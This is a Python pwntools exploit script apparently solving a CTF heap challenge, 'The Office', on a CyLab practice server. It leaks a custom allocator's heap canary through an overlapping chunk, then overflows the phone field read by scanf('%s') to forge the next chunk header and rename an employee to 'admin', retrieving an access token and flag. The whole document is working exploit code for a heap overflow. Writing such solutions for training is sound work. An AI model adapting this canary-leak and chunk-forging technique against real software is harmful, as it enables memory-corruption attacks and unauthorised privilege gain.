#!/usr/bin/env python3
# picoCTF 2021 "The Office" (CyLab id 172): custom malloc w/ canaries.
# Leak heap canary via building-# overlap, then phone scanf("%s") heap overflow
# to forge the adjacent chunk header and rename an employee to "admin".
import subprocess, sys, re, time
from pwn import *

context.log_level = 'info'
HOST = 'chatelaine.cylabacademy.net'
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 45426
WS = {0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20}


def resolve(host, tries=20):
    for _ in range(tries):
        o = subprocess.run(['getent', 'ahostsv4', host], capture_output=True, text=True).stdout
        for line in o.splitlines():
            if line.split() and '.' in line.split()[0]:
                return line.split()[0]
        time.sleep(2)
    return host


def make(p):
    def choose(c):
        p.recvuntil(b'Get access token')
        p.sendline(str(c).encode())

    def add(name, email=None, phone=b'0'):
        choose(1)
        p.sendlineafter(b'Name:', name)
        if email is not None:
            p.sendlineafter(b'Email (y/n)?', b'y')
            p.sendlineafter(b'Email address:', email)
        else:
            p.sendlineafter(b'Email (y/n)?', b'n')
        p.sendlineafter(b'Salary:', b'7')
        p.sendlineafter(b'Phone #:', phone)
        p.sendlineafter(b'Bldg (y/n)?', b'n')

    def rem(i):
        choose(2)
        p.sendlineafter(b'#?', str(i).encode())

    def lst():
        choose(3)
        return p.recvuntil(b'Get access token')

    def token(i):
        choose(4)
        p.sendlineafter(b'#?', str(i).encode())
        time.sleep(0.4)
        return p.recvrepeat(3)

    return add, rem, lst, token


def attempt(ip):
    p = remote(ip, PORT)
    p.timeout = 10
    add, rem, lst, token = make(p)

    add(b'alice', email=b'A' * 28)   # 28-char email -> 48-byte chunk (36 data)
    rem(0)                            # free it
    add(b'bob')                       # reuse
    add(b'charlie')                   # charlie directly after bob
    out = lst()
    can = None
    for b in out.split(b'Employee '):
        if b.startswith(b'1:'):
            m = re.search(rb'Bldg #: (\d+)', b)
            if m:
                can = int(m.group(1))
    if can is None:
        log.warning("could not parse canary")
        return None
    log.info("canary = 0x%08x" % can)
    if any(x in WS for x in p32(can)):
        log.warning("canary contains whitespace -> reconnect")
        p.close()
        return 'RETRY'

    rem(0)  # remove bob -> dave will land right before charlie
    payload = b'A' * 28 + p32(can) + p32(0x35) + p32(0x35) + b'admin'
    add(b'dave', phone=payload)
    out = lst()
    log.info("after overflow:\n" + out.decode('latin1', 'replace'))
    res = token(1)
    log.info("TOKEN: " + res.decode('latin1', 'replace'))
    p.close()
    m = re.search(rb'academy\{[^}]+\}', res)
    return m.group(0).decode() if m else None


def main():
    ip = resolve(HOST)
    for i in range(10):
        try:
            r = attempt(ip)
        except Exception as e:
            log.warning("attempt error: %s" % e)
            r = None
        if r == 'RETRY':
            continue
        if r:
            print("FLAG:", r)
            return
    print("no flag")


main()
